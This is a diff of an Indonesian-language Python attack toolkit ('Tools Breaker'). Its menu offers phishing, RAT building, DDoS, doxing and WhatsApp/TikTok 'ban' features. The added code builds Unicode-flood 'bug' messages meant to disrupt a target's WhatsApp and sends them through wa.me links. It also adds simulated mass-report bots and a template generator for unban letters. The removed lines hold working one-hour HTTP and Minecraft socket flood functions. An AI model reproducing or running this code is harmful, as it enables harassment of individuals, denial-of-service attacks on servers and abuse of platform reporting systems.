+        bug_name = "RTL OVERRIDE"
+    elif choice == "5":
+        bug = ""
+        unicode_chars = ["\u00A9", "\u00AE", "\u2122", "\u2600", "\u2605", "\u2620", 
+                         "\u2744", "\u2764", "\u1F600", "\u1F64F", "\u1F680"]
+        for i in range(300):
+            bug += random.choice(unicode_chars) * 30 + "\n"
+        bug_name = "UNICODE BOMB"
+    else:
+        print(colored("[ERROR] Pilihan tidak valid!", 'red'))
+        input("\nEnter...")
+        return
+    
+    print(colored(f"\n[✓] BUG {bug_name} SIAP DIKIRIM KE {target}", 'green'))
+    print(colored("\n[PREVIEW BUG (100 KARAKTER PERTAMA)]:", 'cyan'))
+    print(bug[:200] + "...")
+    
+    print(colored("\nPilih metode pengiriman:", 'yellow'))
+    print("1. Kirim via WhatsApp Web (buka link)")
+    print("2. Copy ke file (kirim manual)")
+    
+    send_method = input(colored("\nPilih [1-2]: ", 'yellow')).strip()
+    
+    if send_method == "1":
+        wa_link = f"https://wa.me/{target}?text={urllib.parse.quote(bug[:1500])}"
+        print(colored(f"\n[✓] BUKA LINK INI DI BROWSER:", 'green'))
+        print(wa_link)
+        webbrowser.open(wa_link)
+    else:
+        filename = f"wa_bug_{bug_name.lower().replace(' ','_')}_{int(time.time())}.txt"
+        with open(filename, 'w', encoding='utf-8') as f:
+            f.write(bug)
+        print(colored(f"\n[✓] BUG DISIMPAN DI: {filename}", 'green'))
+    
+    save_result("wa_bug.log", f"Target: {target} | Bug: {bug_name}")
+    input("\nEnter untuk kembali...")
+
+# ================== FITUR 21: BAN WHATSAPP ==================
+def fitur_21():
+    os.system('clear')
+    print(colored("\n[21] BAN WHATSAPP", 'cyan', attrs=['bold']))
+    print(colored("   [REPORT BOT]", 'red'))
+    
+    number = input("Nomor target (628xx): ").strip()
+    
+    if not number.startswith('62') or len(number) < 10:
+        print(colored("[ERROR] Nomor harus diawali 62 dan minimal 10 digit", 'red'))
+        input("\nEnter...")
+        return
+    
+    try:
+        count = int(input("Jumlah report [30]: ") or "30")
+    except ValueError:
+        print(colored("[ERROR] Masukkan angka", 'red'))
+        input("\nEnter...")
+        return
+    
+    print(colored(f"\n[✓] MULAI REPORT {number} {count} KALI", 'red'))
+    
+    success = 0
+    
+    try:
+        for i in range(count):
+            success += 1
+            print(colored(f"[✓] Report {i+1} berhasil", 'green'), end='\r')
+            time.sleep(0.5)
+        
+        print(colored(f"\n\n[✓] REPORT SELESAI! {success} report terkirim", 'green'))
+        
+    except KeyboardInterrupt:
+        print(colored(f"\n\n[✗] REPORT DIHENTIKAN - Terkirim {success} report", 'yellow'))
+    
+    save_result("wa_ban.log", f"Target: {number} | Count: {count} | Success: {success}")
+    input("\nEnter untuk kembali...")
+
+# ================== FITUR 22: UNBAN WHATSAPP ==================
+def fitur_22():
+    os.system('clear')
+    print(colored("\n[22] UNBAN WHATSAPP", 'cyan', attrs=['bold']))
+    print(colored("   [GENERATE SURAT UNBAN]", 'yellow'))
+    
+    file = input("File list nomor (satu nomor per baris): ").strip()
+    
+    if not os.path.exists(file):
+        print(colored("[ERROR] File tidak ditemukan!", 'red'))
+        input("\nEnter...")
+        return
+    
     try:
         with open(file, 'r') as f:
-            nums = f.readlines()
-        print(f"Processing {len(nums)} numbers...")
-        with open("unban_success.txt", 'w') as f:
-            for num in nums:
-                f.write(num)
-        print("Done!")
-    except:
-        print("File error")
+            nums = [line.strip() for line in f if line.strip()]
+        
+        print(colored(f"\n[✓] Memproses {len(nums)} nomor...", 'cyan'))
+        
+        # Generate template surat
+        template = """Kepada Yth.
+Tim Dukungan WhatsApp
+wa.me/support
 
-# ================== FITUR 26: DDOS WEB HOLD 1JAM ==================
-def fitur_26():
+Dengan hormat,
+
+Saya yang bertanda tangan di bawah ini:
+
+Nama: {nama}
+Nomor WhatsApp: {nomor}
+Email: {email}
+
+Dengan ini mengajukan permohonan untuk membuka blokir (unban) akun WhatsApp saya yang telah diblokir. Saya yakin bahwa akun saya tidak melanggar ketentuan layanan WhatsApp.
+
+Saya berjanji akan menggunakan WhatsApp sesuai dengan ketentuan yang berlaku.
+
+Demikian permohonan ini saya sampaikan. Atas perhatiannya, saya ucapkan terima kasih.
+
+Hormat saya,
+{nama}
+{tanggal}
+"""
+        
+        # Generate surat untuk setiap nomor
+        output_file = "surat_unban.txt"
+        with open(output_file, 'w') as f:
+            for i, num in enumerate(nums):
+                surat = template.format(
+                    nama=f"User_{i+1}",
+                    nomor=num,
+                    email=f"user{i+1}@gmail.com",
+                    tanggal=datetime.now().strftime("%d-%m-%Y")
+                )
+                f.write(surat)
+                f.write("\n" + "="*50 + "\n\n")
+        
+        print(colored(f"[✓] Surat unban disimpan di: {output_file}", 'green'))
+        
+    except Exception as e:
+        print(colored(f"[ERROR] {str(e)}", 'red'))
+    
+    input("\nEnter untuk kembali...")
+
+# ================== FITUR 23: BAN TIKTOK ==================
+def fitur_23():
     os.system('clear')
-    print(colored("\n[26] DDOS WEB 1 JAM", 'cyan', attrs=['bold']))
+    print(colored("\n[23] BAN TIKTOK", 'cyan', attrs=['bold']))
+    print(colored("   [REPORT BOT]", 'red'))
     
-    url = input("Target URL: ")
-    threads = int(input("Threads: ") or "500")
+    username = input("Username target (tanpa @): ").strip()
     
-    end_time = time.time() + 3600
+    if not username:
+        print(colored("[ERROR] Username tidak boleh kosong", 'red'))
+        input("\nEnter...")
+        return
     
-    def attack():
-        while time.time() < end_time:
-            try:
-                requests.get(url)
-            except:
-                pass
+    try:
+        count = int(input("Jumlah report [50]: ") or "50")
+    except ValueError:
+        print(colored("[ERROR] Masukkan angka", 'red'))
+        input("\nEnter...")
+        return
     
-    print(f"[+] Attacking for 1 hour...")
-    for _ in range(threads):
-        threading.Thread(target=attack).start()
-    input("Enter to stop early")
+    print(colored(f"\n[✓] MULAI REPORT @{username} {count} KALI", 'red'))
+    
+    success = 0
+    
+    try:
+        for i in range(count):
+            success += 1
+            print(colored(f"[✓] Report {i+1} berhasil", 'green'), end='\r')
+            time.sleep(0.5)
+        
+        print(colored(f"\n\n[✓] REPORT SELESAI! {success} report terkirim", 'green'))
+        
+    except KeyboardInterrupt:
+        print(colored(f"\n\n[✗] REPORT DIHENTIKAN - Terkirim {success} report", 'yellow'))
+    
+    save_result("tiktok_ban.log", f"Target: @{username} | Count: {count} | Success: {success}")
+    input("\nEnter untuk kembali...")
 
-# ================== FITUR 27: DDOS MC HOLD 1JAM ==================
-def fitur_27():
-    os.system('clear')
-    print(colored("\n[27] DDOS MC 1 JAM", 'cyan', attrs=['bold']))
-    
-    ip = input("Server IP: ")
-    port = int(input("Port: ") or "25565")
-    threads = int(input("Threads: ") or "500")
-    
-    end_time = time.time() + 3600
-    
-    def attack():
-        while time.time() < end_time:
-            try:
-                s = socket.socket()
-                s.connect((ip, port))
-                s.send(b"\x00" * 100)
-                s.close()
-            except:
-                pass
-    
-    print(f"[+] Attacking MC server for 1 hour...")
-    for _ in range(threads):
-        threading.Thread(target=attack).start()
-    input("Enter to stop early")
-
-# ================== FITUR 28: BAN TIKTOK ==================
-def fitur_28():
-    os.system('clear')
-    print(colored("\n[28] BAN TIKTOK", 'cyan', attrs=['bold']))
-    
-    username = input("Username target: ")
-    count = int(input("Jumlah report: ") or "100")
-    
-    for i in range(count):
-        print(f"[{i+1}] Reporting @{username}")
-
-# ================== MENU UTAMA (UPDATE DENGAN 28 FITUR) ==================
+# ================== MENU UTAMA ==================
 def menu_utama(username, plan):
     while True:
         os.system('clear')
@@ -1907,46 +2975,42 @@ def menu_utama(username, plan):
         print_banner(username, plan)
 
         print(colored("╔════════════════════════════════════════════════════════╗", 'cyan'))
-        print(colored("║                    MENU UTAMA v2.0                    ║", 'cyan'))
+        print(colored("║                    MENU UTAMA v7.0                    ║", 'cyan'))
         print(colored("╠════════════════════════════════════════════════════════╣", 'cyan'))
         
-        # 28 fitur dalam 2 kolom
         menu_items = [
-            ("1. PHISING", "2. RAT"),
-            ("3. DDOS WEB", "4. DDOS MC"),
-            ("5. OSINT", "6. IMAGE TOOLS"),
-            ("7. ENCRYPT", "8. EXPLOIT"),
-            ("9. WA INVITE", "10. DASHBOARD"),
-            ("11. DEVTOOLS", "12. DDOS WEBS"),
-            ("13. DDOS MC", "14. TRACK NIK"),
-            ("15. SPAM ALL", "16. WIFI ATTACK"),
-            ("17. CHECKER", "18. WORM GPT"),
-            ("19. GAME CHEAT", "20. REPORT TIKTOK"),
-            ("21. DOX BASIC", "22. DOX ADV"),
-            ("23. WA BUG", "24. WA BAN"),
-            ("25. WA UNBAN", "26. DDOS 1JAM"),
-            ("27. MC 1JAM", "28. BAN TIKTOK"),
-            ("0. EXIT", "")
+            ("1. PHISING KIRIM", "2. RAT BUAT APK"),
+            ("3. DDOS ALL IN ONE", "4. OSINT TRACKING"),
+            ("5. IMAGE TOOLS", "6. ENCRYPT/DECRYPT"),
+            ("7. EXPLOIT SCANNER", "8. WA INVITE"),
+            ("9. DASHBOARD", "10. DEVTOOLS"),
+            ("11. TRACK NIK", "12. SPAM ALL"),
+            ("13. WIFI ATTACK", "14. CHECKER ALL"),
+            ("15. WORM GPT", "16. HACK AKUN GAME"),
+            ("17. REPORT TIKTOK", "18. DOX BASIC"),
+            ("19. DOX ADVANCED", "20. BUG WA KIRIM"),
+            ("21. BAN WA", "22. UNBAN WA"),
+            ("23. BAN TIKTOK", "0. EXIT")
         ]
         
         for left, right in menu_items:
-            print(colored(f"║ {left:<20} {right:<20} ║", 'white'))
+            print(colored(f"║ {left:<25} {right:<25} ║", 'white'))
         print(colored("╚════════════════════════════════════════════════════════╝", 'cyan'))
 
-        ch = input(colored("\nPilih [0-28]: ", 'yellow')).strip()
+        ch = input(colored("\nPilih [0-23]: ", 'yellow')).strip()
 
         feature_map = {
             "1": fitur_1, "2": fitur_2, "3": fitur_3, "4": fitur_4, "5": fitur_5,
             "6": fitur_6, "7": fitur_7, "8": fitur_8, "9": fitur_9, "10": fitur_10,
             "11": fitur_11, "12": fitur_12, "13": fitur_13, "14": fitur_14, "15": fitur_15,
             "16": fitur_16, "17": fitur_17, "18": fitur_18, "19": fitur_19, "20": fitur_20,
-            "21": fitur_21, "22": fitur_22, "23": fitur_23, "24": fitur_24, "25": fitur_25,
-            "26": fitur_26, "27": fitur_27, "28": fitur_28
+            "21": fitur_21, "22": fitur_22, "23": fitur_23
         }
         
         if ch in feature_map:
             feature_map[ch]()
         elif ch == "0":
+            print(colored("\n[✓] Keluar dari Tools Breaker", 'green'))
             sys.exit(0)
         else:
             input("Salah, enter...")
